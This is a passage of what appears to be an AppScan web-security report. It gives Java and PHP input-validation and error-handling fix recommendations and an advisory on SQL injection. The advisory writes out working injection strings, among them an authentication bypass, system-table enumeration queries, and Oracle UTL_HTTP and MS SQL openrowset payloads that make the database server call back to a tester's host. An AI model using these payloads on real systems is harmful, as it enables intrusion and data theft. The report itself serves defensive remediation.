      public Class ErrorKeys {
          public static final String ERROR_USERNAME_REQUIRED = "error.username.required";
          public static final String ERROR_USERNAME_ALPHANUMERIC = "error.username.alphanumeric";
          public static final String ERROR_USERNAME_DUPLICATE = "error.username.duplicate";
          public static final String ERROR_USERNAME_INVALID = "error.username.invalid";
          ...
      }
</code>
              <br />
              <indentText>    </indentText>
              <text>- Error: encapsulates an individual error</text>
              <br />
              <br />
              <code>      // Example: Error encapsulates an error key.
      // Error is serializable to support code executing in multiple JVMs.
      public Class Error implements Serializable {
          
          // Constructor given a specified error key
          public Error(String key) {
              this(key, null);
          }
          
          // Constructor given a specified error key and array of placeholder objects
          public Error(String key, Object[] values) {
              this.key = key;
              this.values = values;
          }
          
          // Returns the error key
          public String getKey() {
              return this.key;
          }
          
          // Returns the placeholder values
          public Object[] getValues() {
              return this.values;
          }
          
          private String key = null;
          private Object[] values = null;
      }    
</code>
              <br />
              <br />
              <text>- Errors: encapsulates a Collection of errors</text>
              <br />
              <br />
              <code>      // Example: Errors encapsulates the Error objects being reported to the presentation layer.
      // Errors are stored in a HashMap where the key is the bean property name and value is an
      // ArrayList of Error objects.
      public Class Errors implements Serializable {
      
          // Adds an Error object to the Collection of errors for the specified bean property.
          public void addError(String property, Error error) {
              ArrayList propertyErrors = (ArrayList)errors.get(property);
              if (propertyErrors == null) {
                  propertyErrors = new ArrayList();
                  errors.put(property, propertyErrors);
              }
              propertyErrors.put(error);            
          }
          
          // Returns true if there are any errors
          public boolean hasErrors() {
              return (errors.size &gt; 0);
          }
          
          // Returns the Errors for the specified property
          public ArrayList getErrors(String property) {
              return (ArrayList)errors.get(property);
          }
          private HashMap errors = new HashMap();
      }
</code>
              <br />
              <br />
              <text>Using the above framework classes, here is an example to process validation errors of the "user_name" field:</text>
              <br />
              <br />
              <code>  // Example to process validation errors of the "user_name" field.
  Errors errors = new Errors();
  String userName = request.getParameter("user_name");
  // (a) Required validation rule
  if (!Validator.validateRequired(userName)) {
      errors.addError("user_name", new Error(ErrorKeys.ERROR_USERNAME_REQUIRED));
  } // (b) Alpha-numeric validation rule
  else if (!Validator.matchPattern(userName, "^[a-zA-Z0-9]*$")) {
      errors.addError("user_name", new Error(ErrorKeys.ERROR_USERNAME_ALPHANUMERIC));
  }
  else
  {
      // (c) Duplicate check validation rule
      // We assume that there is an existing UserValidationEJB session bean that implements
      // a checkIfDuplicate() method to verify if the user already exists in the database.
      try {
          ...        
          if (UserValidationEJB.checkIfDuplicate(userName)) {
              errors.addError("user_name", new Error(ErrorKeys.ERROR_USERNAME_DUPLICATE));
          }
      } catch (RemoteException e) {
          // log the error
          logger.error("Could not validate user for specified userName: " + userName);
          errors.addError("user_name", new Error(ErrorKeys.ERROR_USERNAME_DUPLICATE);
      }
  }
  // set the errors object in a request attribute called "errors"
  request.setAttribute("errors", errors);
  ...
</code>
              <br />
              <br />
              <text>[2] Reporting Errors</text>
              <br />
              <text>There are two ways to report web-tier application errors:</text>
              <br />
              <text>(a) Servlet Error Mechanism</text>
              <br />
              <text>(b) JSP Error Mechanism</text>
              <br />
              <br />
              <text>[2-a] Servlet Error Mechanism</text>
              <br />
              <text>A Servlet may report errors by:</text>
              <br />
              <text>- forwarding to the input JSP (having already stored the errors in a request attribute), OR</text>
              <br />
              <text>- calling response.sendError with an HTTP error code argument, OR</text>
              <br />
              <text>- throwing an exception</text>
              <br />
              <br />
              <text>It is good practice to process all known application errors (as described in section [1]), store them in a request attribute, and forward to the input JSP. The input JSP should display the error messages and prompt the user to re-enter the data.  The following example illustrates how to forward to an input JSP (userInput.jsp):</text>
              <br />
              <br />
              <code>  // Example to forward to the userInput.jsp following user validation errors
  RequestDispatcher rd = getServletContext().getRequestDispatcher("/user/userInput.jsp");
  if (rd != null) {
      rd.forward(request, response);
  }
</code>
              <br />
              <br />
              <text>If the Servlet cannot forward to a known JSP page, the second option is to report an error using the response.sendError method with HttpServletResponse.SC_INTERNAL_SERVER_ERROR (status code 500) as an argument.  Refer to the javadoc of javax.servlet.http.HttpServletResponse for more details on the various HTTP status codes.</text>
              <br />
              <br />
              <text>Example to return a HTTP error:</text>
              <br />
              <code>  // Example to return a HTTP error code
  RequestDispatcher rd = getServletContext().getRequestDispatcher("/user/userInput.jsp");
  if (rd == null) {
      // messages is a resource bundle with all message keys and values
      response.sendError(HttpServletResponse.SC_INTERNAL_SERVER_ERROR,
                              messages.getMessage(ErrorKeys.ERROR_USERNAME_INVALID));
  }
</code>
              <br />
              <br />
              <text>As a last resort, Servlets can throw an exception, which must be a subclass of one of the following classes:</text>
              <br />
              <text>- RuntimeException</text>
              <br />
              <text>- ServletException</text>
              <br />
              <text>- IOException</text>
              <br />
              <br />
              <text>[2-b] JSP Error Mechanism</text>
              <br />
              <text>JSP pages provide a mechanism to handle runtime exceptions by defining an errorPage directive as shown in the following example:</text>
              <br />
              <code>      &lt;%@ page errorPage="/errors/userValidation.jsp" %&gt;
</code>
              <br />
              <br />
              <text>Uncaught JSP exceptions are forwarded to the specified errorPage, and the original exception is set in a request parameter called javax.servlet.jsp.jspException.  The error page must include a isErrorPage directive:</text>
              <br />
              <code>      &lt;%@ page isErrorPage="true" %&gt;
</code>
              <br />
              <br />
              <text>The isErrorPage directive causes the "exception" variable to be initialized to the exception object being thrown.</text>
              <br />
              <br />
              <text>[3] Rendering Errors</text>
              <br />
              <text>The J2SE Internationalization APIs provide utility classes for externalizing application resources and formatting messages including:</text>
              <br />
              <br />
              <text>(a) Resource Bundles</text>
              <br />
              <text>(b) Message Formatting</text>
              <br />
              <br />
              <text>[3-a] Resource Bundles</text>
              <br />
              <text>Resource bundles support internationalization by separating localized data from the source code that uses it.  Each resource bundle stores a map of key/value pairs for a specific locale.</text>
              <br />
              <br />
              <text>It is common to use or extend java.util.PropertyResourceBundle, which stores the content in an external properties file as shown in the following example:</text>
              <br />
              <br />
              <code>  ################################################
  # ErrorMessages.properties
  ################################################
  # required user name error message
  error.username.required=User name field is required
  # invalid user name format
  error.username.alphanumeric=User name must be alphanumeric
  # duplicate user name error message
  error.username.duplicate=User name {0} already exists, please choose another one
  ...
</code>
              <br />
              <br />
              <text>Multiple resources can be defined to support different locales (hence the name resource bundle).  For example, ErrorMessages_fr.properties can be defined to support the French member of the bundle family.  If the resource member of the requested locale does not exist, the default member is used.  In the above example, the default resource is ErrorMessages.properties.  Depending on the user's locale, the application (JSP or Servlet) retrieves content from the appropriate resource.</text>
              <br />
              <br />
              <text>[3-b] Message Formatting</text>
              <br />
              <text>The J2SE standard class java.util.MessageFormat provides a generic way to create messages with replacement placeholders.  A MessageFormat object contains a pattern string with embedded format specifiers as shown below:</text>
              <br />
              <br />
              <code>  // Example to show how to format a message using placeholder parameters
  String pattern = "User name {0} already exists, please choose another one";
  String userName = request.getParameter("user_name");
  Object[] args = new Object[1];
  args[0] = userName;
  String message = MessageFormat.format(pattern, args);
</code>
              <br />
              <br />
              <text>Here is a more comprehensive example to render error messages using ResourceBundle and MessageFormat:</text>
              <br />
              <br />
              <code>  // Example to render an error message from a localized ErrorMessages resource (properties file)
  // Utility class to retrieve locale-specific error messages
  public Class ErrorMessageResource {
      
      // Returns the error message for the specified error key in the environment locale
      public String getErrorMessage(String errorKey) {
          return getErrorMessage(errorKey, defaultLocale);
      }
      
      // Returns the error message for the specified error key in the specified locale
      public String getErrorMessage(String errorKey, Locale locale) {
          return getErrorMessage(errorKey, null, locale);
      }
      
      // Returns a formatted error message for the specified error key in the specified locale
      public String getErrorMessage(String errorKey, Object[] args, Locale locale) {    
          // Get localized ErrorMessageResource
          ResourceBundle errorMessageResource = ResourceBundle.getBundle("ErrorMessages", locale);
          // Get localized error message
          String errorMessage = errorMessageResource.getString(errorKey);
          if (args != null) {
              // Format the message using the specified placeholders args
              return MessageFormat.format(errorMessage, args);
          } else {
              return errorMessage;
          }
      }
      
      // default environment locale
      private Locale defaultLocale = Locale.getDefaultLocale();
  }
  ...
  // Get the user's locale
  Locale userLocale = request.getLocale();
  // Check if there were any validation errors
  Errors errors = (Errors)request.getAttribute("errors");
  if (errors != null &amp;&amp; errors.hasErrors()) {
      // iterate through errors and output error messages corresponding to the "user_name" property
      ArrayList userNameErrors = errors.getErrors("user_name");
      ListIterator iterator = userNameErrors.iterator();
      while (iterator.hasNext()) {
          // Get the next error object
          Error error = (Error)iterator.next();
          String errorMessage = ErrorMessageResource.getErrorMessage(error.getKey(), userLocale);
          output.write(errorMessage + "\r\n");
      }
  }
</code>
              <br />
              <br />
              <text>It is recommended to define a custom JSP tag (e.g. displayErrors), to iterate through and render error messages as shown in the above example.</text>
              <br />
              <br />
              <text>[4] Error Mapping</text>
              <br />
              <text>Normally, the Servlet Container will return a default error page corresponding to either the response status code or the exception.  A mapping between the status code or the exception and a web resource may be specified using custom error pages. It is a good practice to develop static error pages that do not disclose internal error states (by default, most Servlet containers will report internal error messages).  This mapping is configured in the Web Deployment Descriptor (web.xml) as specified in the following example:</text>
              <br />
              <br />
              <code>  &lt;!-- Mapping of HTTP error codes and application exceptions to error pages --&gt;
  &lt;error-page&gt;
    &lt;exception-type&gt;UserValidationException&lt;/exception-type&gt;
    &lt;location&gt;/errors/validationError.html&lt;/error-page&gt;
  &lt;/error-page&gt;
  &lt;error-page&gt;
    &lt;error-code&gt;500&lt;/exception-type&gt;
    &lt;location&gt;/errors/internalError.html&lt;/error-page&gt;
  &lt;/error-page&gt;
  &lt;error-page&gt;
  ...
  &lt;/error-page&gt;
  ...
</code>
              <br />
              <br />
              <br />
              <text>RECOMMENDED JAVA TOOLS</text>
              <br />
              <text>The two main Java frameworkss for server-side validation are:</text>
              <br />
              <text>[1] Jakarta Commons Validator (integrated with Struts 1.1)</text>
              <br />
              <text>The Jakarta Commons Validator is a Java framework that defines the error handling mechanism as described above.  Validation rules are configured in an XML file that defines input validation rules for form fields and the corresponding validation error keys.  Struts provides internationalization support to build localized applications using resource bundles and message formatting.</text>
              <br />
              <br />
              <text>Example to validate the userName field of a loginForm using Struts Validator:</text>
              <br />
              <code>  &lt;form-validation&gt;
      &lt;global&gt;
          ...
          &lt;validator name="required"
              classname="org.apache.struts.validator.FieldChecks"
              method="validateRequired"
              msg="errors.required"&gt;
          &lt;/validator&gt;
          &lt;validator name="mask"
              classname="org.apache.struts.validator.FieldChecks"
              method="validateMask"
              msg="errors.invalid"&gt;
          &lt;/validator&gt;
          ...
      &lt;/global&gt;
      &lt;formset&gt;
          &lt;form name="loginForm"&gt;
              &lt;!-- userName is required and is alpha-numeric case insensitive --&gt;
              &lt;field property="userName" depends="required,mask"&gt;
                  &lt;!-- message resource key to display if validation fails --&gt;
                  &lt;msg name="mask" key="login.userName.maskmsg"/&gt;
                  &lt;arg0 key="login.userName.displayname"/&gt;
                  &lt;var&gt;
                      &lt;var-name&gt;mask&lt;/var-name&gt;
                      &lt;var-value&gt;^[a-zA-Z0-9]*$&lt;/var-value&gt;
                  &lt;/var&gt;
              &lt;/field&gt;
          ...
          &lt;/form&gt;
          ...
      &lt;/formset&gt;
  &lt;/form-validation&gt;
</code>
              <br />
              <br />
              <text>The Struts JSP tag library defines the "errors" tag that conditionally displays a set of accumulated error messages as shown in the following example:</text>
              <br />
              <br />
              <code>  &lt;%@ page language="java" %&gt;
  &lt;%@ taglib uri="/WEB-INF/struts-html.tld" prefix="html" %&gt;
  &lt;%@ taglib uri="/WEB-INF/struts-bean.tld" prefix="bean" %&gt;
  &lt;html:html&gt;
  &lt;head&gt;
  &lt;body&gt;
      &lt;html:form action="/logon.do"&gt;    
      &lt;table border="0" width="100%"&gt;
      &lt;tr&gt;
          &lt;th align="right"&gt;
              &lt;html:errors property="username"/&gt;
              &lt;bean:message key="prompt.username"/&gt;
          &lt;/th&gt;
          &lt;td align="left"&gt;
              &lt;html:text property="username" size="16"/&gt;
          &lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
      &lt;td align="right"&gt;
          &lt;html:submit&gt;&lt;bean:message key="button.submit"/&gt;&lt;/html:submit&gt;
      &lt;/td&gt;
      &lt;td align="right"&gt;
          &lt;html:reset&gt;&lt;bean:message key="button.reset"/&gt;&lt;/html:reset&gt;
      &lt;/td&gt;
      &lt;/tr&gt;
      &lt;/table&gt;
      &lt;/html:form&gt;
  &lt;/body&gt;
  &lt;/html:html&gt;
</code>
              <br />
              <br />
              <text>[2] JavaServer Faces Technology</text>
              <br />
              <text>JavaServer Faces Technology is a set of Java APIs (JSR 127) to represent UI components, manage their state, handle events, validate input, and support internationalization.</text>
              <br />
              <br />
              <text>The JavaServer Faces API defines the "output_errors" UIOutput Renderer, which displays error messages for an entire page or error messages associated with a specified client identifier.</text>
              <br />
              <br />
              <text>Example to validate the userName field of a loginForm using JavaServer Faces:</text>
              <br />
              <code>  &lt;%@ taglib uri="http://java.sun.com/jsf/html" prefix="h" %&gt;
  &lt;%@ taglib uri="http://java.sun.com/jsf/core" prefix="f" %&gt;
  ...
  &lt;jsp:useBean id="UserBean"
      class="myApplication.UserBean" scope="session" /&gt;
  &lt;f:use_faces&gt;
    &lt;h:form formName="loginForm" &gt;
      &lt;h:input_text id="userName" size="20" modelReference="UserBean.userName"&gt;
          &lt;f:validate_required/&gt;
          &lt;f:validate_length minimum="8" maximum="20"/&gt;    
      &lt;/h:input_text&gt;
      &lt;!-- display errors if present --&gt;
      &lt;h:output_errors id="loginErrors" clientId="userName"/&gt;
      &lt;h:command_button id="submit" label="Submit" commandName="submit" /&gt;&lt;p&gt;
    &lt;/h:form&gt;
  &lt;/f:use_faces&gt;
</code>
              <br />
              <br />
              <text>REFERENCES</text>
              <br />
              <text>Java API 1.3 - </text>
              <link target="http://java.sun.com/j2se/1.3/docs/api/">http://java.sun.com/j2se/1.3/docs/api/</link>
              <br />
              <text>Java API 1.4 - </text>
              <link target="http://java.sun.com/j2se/1.4/docs/api/">http://java.sun.com/j2se/1.4/docs/api/</link>
              <br />
              <text>Java Servlet API 2.3 - </text>
              <link target="http://java.sun.com/products/servlet/2.3/javadoc/">http://java.sun.com/products/servlet/2.3/javadoc/</link>
              <br />
              <text>Java Regular Expression Package - </text>
              <link target="http://jakarta.apache.org/regexp/">http://jakarta.apache.org/regexp/</link>
              <br />
              <text>Jakarta Validator - </text>
              <link target="http://jakarta.apache.org/commons/validator/">http://jakarta.apache.org/commons/validator/</link>
              <br />
              <text>JavaServer Faces Technology - </text>
              <link target="http://java.sun.com/j2ee/javaserverfaces/">http://java.sun.com/j2ee/javaserverfaces/</link>
            </fixRecommendation>
            <fixRecommendation type="PHP">
              <text>** Input Data Validation:</text>
              <br />
              <br />
              <text>While data validations may be provided as a user convenience on the client-tier, data validation must always be performed on the server-tier.  Client-side validations are inherently insecure because they can be easily bypassed, e.g. by disabling Javascript.</text>
              <br />
              <br />
              <text>A good design usually requires the web application framework to provide server-side utility routines to validate the following:</text>
              <br />
              <text>[1] Required field</text>
              <br />
              <text>[2] Field data type (all HTTP request parameters are Strings by default)</text>
              <br />
              <text>[3] Field length</text>
              <br />
              <text>[4] Field range</text>
              <br />
              <text>[5] Field options</text>
              <br />
              <text>[6] Field pattern</text>
              <br />
              <text>[7] Cookie values</text>
              <br />
              <text>[8] HTTP Response</text>
              <br />
              <br />
              <text>A good practice is to implement a function or functions that validates each application parameter.  The following sections describe some example checking.</text>
              <br />
              <br />
              <text>[1] Required field</text>
              <br />
              <text>Always check that the field is not null and its length is greater than zero, excluding leading and trailing white spaces.</text>
              <br />
              <br />
              <text>Example of how to validate required fields:</text>
              <br />
              <br />
              <code>  // PHP example to validate required fields
  function validateRequired($input) {
      ...
      $pass = false;
      if (strlen(trim($input))&gt;0){
          $pass = true;
      }
      return $pass;
      ...
  }
  ...
  if (validateRequired($fieldName)) {
      // fieldName is valid, continue processing request
      ...
  }
</code>
              <br />
              <br />
              <br />
              <text>[2] Field data type</text>
              <br />
              <text>In web applications, input parameters are poorly typed.  For example, all HTTP request parameters or cookie values are of type String.  The developer is responsible for verifying the input is of the correct data type.</text>
              <br />
              <br />
              <text>[3] Field length</text>
              <br />
              <text>Always ensure that the input parameter (whether HTTP request parameter or cookie value) is bounded by a minimum length and/or a maximum length.</text>
              <br />
              <br />
              <text>[4] Field range</text>
              <br />
              <text>Always ensure that the input parameter is within a range as defined by the functional requirements.</text>
              <br />
              <br />
              <text>[5] Field options</text>
              <br />
              <text>Often, the web application presents the user with a set of options to choose from, e.g. using the SELECT HTML tag, but fails to perform server-side validation to ensure that the selected value is one of the allowed options.  Remember that a malicious user can easily modify any option value.  Always validate the selected user value against the allowed options as defined by the functional requirements.</text>
              <br />
              <br />
              <text>[6] Field pattern</text>
              <br />
              <text>Always check that user input matches a pattern as defined by the functionality requirements.  For example, if the userName field should only allow alpha-numeric characters, case insensitive, then use the following regular expression:</text>
              <br />
              <text>^[a-zA-Z0-9]+$</text>
              <br />
              <br />
              <text>[7] Cookie value</text>
              <br />
              <text>The same validation rules (described above) apply to cookie values depending on the application requirements, e.g. validate a required value, validate length, etc.</text>
              <br />
              <br />
              <text>[8] HTTP Response</text>
              <br />
              <br />
              <text>[8-1] Filter user input</text>
              <br />
              <text>To guard the application against cross-site scripting, the developer should sanitize HTML by converting sensitive characters to their corresponding character entities.  These are the HTML sensitive characters:</text>
              <br />
              <text>&lt; &gt; " ' % ; ) ( &amp; +</text>
              <br />
              <br />
              <text>PHP includes some automatic sanitation utility functions, such as htmlentities():</text>
              <br />
              <br />
              <code>  $input = htmlentities($input, ENT_QUOTES, 'UTF-8');
</code>
              <br />
              <br />
              <text>In addition, in order to avoid UTF-7 variants of Cross-site Scripting, you should explicitly define the Content-Type header of the response, for example:</text>
              <br />
              <br />
              <code>  &lt;?php
  header('Content-Type: text/html; charset=UTF-8');
  ?&gt;
</code>
              <br />
              <br />
              <text>[8-2] Secure the cookie</text>
              <br />
              <br />
              <text>When storing sensitive data in a cookie and transporting it over SSL, make sure that you first set the secure flag of the cookie in the HTTP response. This will instruct the browser to only use that cookie over SSL connections.</text>
              <br />
              <br />
              <text>You can use the following code example, for securing the cookie:</text>
              <br />
              <br />
              <code>  &lt;$php
      $value = "some_value";
      $time = time()+3600;
      $path = "/application/";
      $domain = ".example.com";
      $secure = 1;
      setcookie("CookieName", $value, $time, $path, $domain, $secure, TRUE);
  ?&gt;
</code>
              <br />
              <br />
              <text>In addition, we recommend that you use the HttpOnly flag. When the HttpOnly flag is set to TRUE the cookie will be made accessible only through the HTTP protocol. This means that the cookie won't be accessible by scripting languages, such as JavaScript. This setting can effectly help to reduce identity theft through XSS attacks (although it is not supported by all browsers).</text>
              <br />
              <br />
              <text>The HttpOnly flag was Added in PHP 5.2.0.</text>
              <br />
              <br />
              <text>REFERENCES</text>
              <br />
              <br />
              <text>[1] Mitigating Cross-site Scripting With HTTP-only Cookies: </text>
              <link target="http://msdn2.microsoft.com/en-us/library/ms533046.aspx">http://msdn2.microsoft.com/en-us/library/ms533046.aspx</link>
              <br />
              <text>[2] PHP Security Consortium: </text>
              <link target="http://phpsec.org/">http://phpsec.org/</link>
              <br />
              <text>[3] PHP &amp; Web Application Security Blog (Chris Shiflett): </text>
              <link target="http://shiflett.org/">http://shiflett.org/</link>
            </fixRecommendation>
          </fixRecommendations>
        </advisory>
        <Severity>High</Severity>
        <EntityType>Parameter</EntityType>
        <Invasive>False</Invasive>
      </IssueType>
      <IssueType ID="GV_SQLErr" Count="1">
        <RemediationID>fix_52000</RemediationID>
        <advisory>
          <name>Database Error Pattern Found</name>
          <testDescription>Application-level test</testDescription>
          <threatClassification>
            <name>Command Execution: SQL Injection</name>
            <reference>http://www.webappsec.org/projects/threat/classes/sql_injection.shtml</reference>
          </threatClassification>
          <testTechnicalDescription>
            <text>AppScan discovered Database Errors in the test response, that may have been triggered by an attack other than SQL Injection.</text>
            <br />
            <text>It is possible, though not certain, that this error indicates a possible SQL Injection vulnerability in the application.</text>
            <br />
            <text>If it does, please read the following SQL Injection advisory carefully:</text>
            <br />
            <br />
            <text>Web applications often use databases at the backend to interact with the enterprise data warehouse. The de-facto standard language for querying databases is SQL (each major database vendor has its own dialect). Web applications often take user input (taken out of the HTTP request) and incorporate it in an SQL query, which is then sent to the backend database. The query results are then processed by the application and sometimes displayed to the user.</text>
            <br />
            <br />
            <text>This mode of operation can be exploited by an attacker if the application is not careful enough with its treatment of user (attacker) input. If this is the case, an attacker can inject malicious data, which when incorporated into an SQL query, changes the original syntax of the query into something completely different. For example, if an application uses user's input (such as username and password) to query a database table of users' accounts in order to authenticate the user, and the attacker has the ability to inject malicious data into the username part of the query (or the password part, or both), the query can be changed into a different data yanking query, a query that modifies the database, or a query that runs shell commands on the database server.</text>
            <br />
            <br />
            <text>Typically, the attacker achieves this goal in steps. He/she will first learn the structure of the SQL query, and then use this knowledge to thwart the query (by injecting data that changes the query syntax) into performing differently than intended. Suppose the query in question is:</text>
            <br />
            <br />
            <indentText> SELECT COUNT(*) FROM accounts WHERE username='$user' AND password='$pass'</indentText>
            <br />
            <text>Where $user and $pass are user input (collected from the HTTP request which invoked the script that constructs the query - either from a GET request query parameters, or from a POST request body parameters). A regular usage of this query would be with values $user=john, $password=secret123. The query formed would be:</text>
            <br />
            <br />
            <indentText> SELECT COUNT(*) FROM accounts WHERE username='john' AND password='secret123'</indentText>
            <br />
            <text>The expected query result is 0 if no such user+password pair exists in the database, and &gt;0 if such pair exists (i.e. there is a user named 'john' in the database, whose password is 'secret123'). This would serve as a basic authentication mechanism for the application. But an attacker can alter this query in the following ways:</text>
            <br />
            <br />
            <text>1. By providing an input consisting of a single apostrophe character ('), the attacker can cause the database to emit an error message, which usually contains valuable information regarding the SQL query. The attack would simply involve sending a request with the user value ' and a password with any value (e.g. foobar). The result would be the following (malformed) SQL query:</text>
            <br />
            <br />
            <indentText> SELECT COUNT(*) FROM accounts WHERE username=''' AND password='foobar'</indentText>
            <br />
            <text>This may yield the following error message (depending on the specific database in use at the backend):</text>
            <br />
            <br />
            <indentText> Syntax error (missing operator) in query expression 'username = ''' AND password = 'foobar''.</indentText>
            <br />
            <text>The attacker is informed that the query is built around the expression username='$user' AND password='$pass'. This crucial information is needed to exploit the SQL query at hand. When the attacker understands the format of the query, his next step would simply be to use:</text>
            <br />
            <br />
            <indentText> user = ' or 1=1 or ''='</indentText>
            <indentText> password = foobar</indentText>
            <br />
            <text>The resulting query is: </text>
            <br />
            <br />
            <indentText> SELECT COUNT(*) FROM accounts WHERE username='' or 1=1 or ''='' AND password='foobar'</indentText>
            <br />
            <text>This means that the query (in the SQL database) will return TRUE for every record of the table "accounts", since the expression 1=1 is always true. Therefore, the query will return the number of records in "accounts", and thus the user (attacker) will be considered valid. There are several variants of this probing method, such as sending ';  or \' (it should be remembered that almost all vendors have their own unique SQL 'dialect'). Specifically sending ' having 1=1 is also known to produce error messages that reveal information about column names. In some cases, the user input is not incorporated in a string context (encompassed in apostrophes), but rather in numeric context, that is, embedded as-is. Thus the input string 1 having 1=1 can be used in such cases.</text>
            <br />
            <br />
            <text>2. In some cases, it is possible to replace the original query with any other query. The way to do it is to prematurely terminate the original query (e.g. by closing the string context using apostrophe, force termination by a query separator character such as semicolon and then write a new query). If the application is flexible enough to receive (and display) data from the modified query (although it is not exactly the expected data), then this technique may be used to download various database tables and records.</text>
            <br />
            <text>Even if the application does not process the unexpected data returned from the database in such way that this data is displayed, it may still be possible to run malicious queries on the database (e.g. to change tables, delete tables, and run shell commands). </text>
            <br />
            <text>Finally, in some cases the desired data can be acquired by crafting the malicious queries in such way that the desired data is returned in the format expected by the application.</text>
            <br />
            <br />
            <text>The following input strings can be used to yield sensitive information from system tables in the database (depending on the way the application handles returned query results, of course):</text>
            <br />
            <br />
            <indentText> '; select @@version,1,1,1-- </indentText>
            <indentText> (MS-SQL database - returns the database version)</indentText>
            <br />
            <indentText> '; select * from master..sysmessages </indentText>
            <indentText> (MS-SQL database - returns system information) </indentText>
            <br />
            <indentText> '; select * from dbo.sysdatabases </indentText>
            <indentText> (MS-SQL database - returns database names managed by the database server)</indentText>
            <br />
            <indentText> '; select * from sys.dba_users </indentText>
            <indentText> (Oracle database - returns database usernames)</indentText>
            <br />
            <text>We see therefore that if user input is not santized (that is, string data is ensured not to have ' or " - these characters must be encoded/escaped, and numeric/boolean or other typed data is ensured to be of proper format), an attacker can make use of this fact and manipulate the database.</text>
            <br />
            <br />
            <text>In the Oracle test variant, the SQL injection is validated by forcing the Oracle database to establish an HTTP connection back from the Oracle server, to the testing machine, using the UTL_HTTP package.</text>
            <br />
            <text>The injection payload sent: ' || UTL_HTTP.REQUEST('http://IP_Address:80/SQL_Injection_Validation') || '</text>
            <br />
            <text>Assuming that the original SQL query was: SELECT COUNT(*) FROM accounts WHERE username='$user' AND password='$pass', the actual SQL query during the SQL injection test will be:</text>
            <br />
            <br />
            <text>SELECT COUNT(*) FROM accounts WHERE username='' || UTL_HTTP.REQUEST('http://IP_Address:80/SQL_Injection_Validation') || '' AND password='$pass'</text>
            <br />
            <br />
            <text>When running this SQL query, the Oracle server will execute the UTL_HTTP.REQUEST entry point, which will contact the testing machine and request the file '/SQL_Injection_Validation' over HTTP.</text>
            <br />
            <br />
            <text>Note: For this test to be validated properly, a direct TCP connection must be possible between the Oracle server and the testing machine.</text>
            <br />
            <br />
            <text>A similar approach is used in an MS SQL port listener test variant.</text>
            <br />
            <text>The injection payload sent: '; select * from openrowset('sqloledb','Network=DBMSSOCN;Address=IP_Address,9999;uid=myUsr;pwd=myPass','select foo from bar')--</text>
            <br />
            <br />
            <text>Assuming that the original SQL query was: SELECT COUNT(*) FROM accounts WHERE username='$user' AND password='$pass', the actual SQL query during the SQL injection test will be:</text>
            <br />
            <br />
            <text>SELECT COUNT(*) FROM accounts WHERE username=''; select * from openrowset('sqloledb','Network=DBMSSOCN;Address=[IP_Address],9999;uid=myUsr;pwd=myPass','select foo from bar')--' AND password='$pass'</text>
            <br />
            <br />
            <text>When running this SQL query, MS SQL server will establish a connection to [IP_Address] on port 9999, as a result of the openrowset() execution.</text>
            <br />
            <br />
            <text>Note: For this test to be validated properly, a direct TCP connection must be possible between the MS SQL server and the testing machine.</text>
          </testTechnicalDescription>
          <causes>
            <cause>Sanitation of hazardous characters was not performed correctly on user input</cause>
          </causes>
          <securityRisks>
            <securityRisk>It is possible to view, modify or delete database entries and tables</securityRisk>
          </securityRisks>
          <affectedProducts>
            <affectedProduct>This issue may affect different types of products.</affectedProduct>
          </affectedProducts>
          <references>
            <link target="http://www.ngssoftware.com/papers/webappdis.doc">"Web Application Disassembly with ODBC Error Messages" (By David Litchfield)</link>
            <link target="http://download.boulder.ibm.com/ibmdl/pub/software/dw/richmedia/rational/08/appscan_demos/sqlinjection/viewer.swf#recorded_advisory">SQL Injection Training Module</link>
            <link target="http://cwe.mitre.org/cgi-bin/jumpmenu.cgi?id=209">CWE-209: Error Message Information Leak</link>
          </references>
          <fixRecommendations>
            <fixRecommendation type="General">
              <text>If the error indicates a SQL Injection vulnerability, please follow the following guidelines:</text>
              <br />
              <br />
              <text>There are several issues whose remediation lies in sanitizing user input.</text>
              <br />
              <text>By verifying that user input does not contain hazardous characters, it is possible to prevent malicious users from causing your application to execute unintended operations, such as launch arbitrary SQL queries, embed Javascript code to be executed on the client side, run various operating system commands etc.</text>
              <br />
              <br />
              <text>It is advised to filter out all the following characters:</text>
              <br />
              <indentText>   [1] |  (pipe sign)</indentText>
              <indentText>   [2] &amp;  (ampersand sign)</indentText>
              <indentText>   [3] ;  (semicolon sign)</indentText>
              <indentText>   [4] $  (dollar sign)</indentText>
              <indentText>   [5] %  (percent sign)</indentText>
              <indentText>   [6] @  (at sign)</indentText>
              <indentText>   [7] '  (single apostrophe)</indentText>
              <indentText>   [8] "  (quotation mark)</indentText>
              <indentText>   [9] \' (backslash-escaped apostrophe)</indentText>
              <indentText>   [10] \" (backslash-escaped quotation mark)</indentText>
              <indentText>   [11] &lt;&gt; (triangular parenthesis)</indentText>
              <indentText>   [12] () (parenthesis)</indentText>
              <indentText>   [13] +  (plus sign)</indentText>
              <indentText>   [14] CR (Carriage return, ASCII 0x0d)</indentText>
              <indentText>   [15] LF (Line feed, ASCII 0x0a)</indentText>
              <indentText>   [16] ,  (comma sign)</indentText>
              <indentText>   [17] \  (backslash)</indentText>
              <br />
              <br />
              <text>The following sections describe the various issues, their fix recommendations and the hazardous characters that might trigger these issues:</text>
              <br />
              <br />
              <br />
              <text>SQL injection and blind SQL injection:</text>
              <br />
              <text>A. Make sure the value and type (such as Integer, Date, etc.) of the user input is valid and expected by the application.</text>
              <br />
              <text>B. Use stored procedures to abstract data access so that users do not directly access tables or views. When using stored procedures, use the ADO command object to implement them, so that variables are strongly typed.</text>
              <br />
              <text>C. Sanitize input to exclude context-changing symbols such as:</text>
              <br />
              <indentText>   [1] '  (single apostrophe)</indentText>
              <indentText>   [2] "  (quotation mark)</indentText>
              <indentText>   [3] \' (backslash-escaped apostrophe)</indentText>
              <indentText>   [4] \" (backslash-escaped quotation mark)</indentText>
              <indentText>   [5] )  (closing parenthesis)</indentText>
              <indentText>   [6] ;  (semicolon)</indentText>
              <br />
              <br />
              <text>Cross site scripting:</text>
              <br />
              <text>A. Sanitize user input and filter out JavaScript code. We suggest that you filter the following characters:</text>
              <br />
              <indentText>   [1] &lt;&gt; (triangular parenthesis)</indentText>
              <indentText>   [2] "  (quotation mark)</indentText>
              <indentText>   [3] '  (single apostrophe)</indentText>
              <indentText>   [4] %  (percent sign)</indentText>
              <indentText>   [5] ;  (semicolon)</indentText>
              <indentText>   [6] () (parenthesis)</indentText>
              <indentText>   [7] &amp;  (ampersand sign)</indentText>
              <indentText>   [8] +  (plus sign)</indentText>
              <text>B. To fix the &lt;%00script&gt; variant see MS article 821349</text>
              <br />
              <text>C. For UTF-7 attacks:</text>
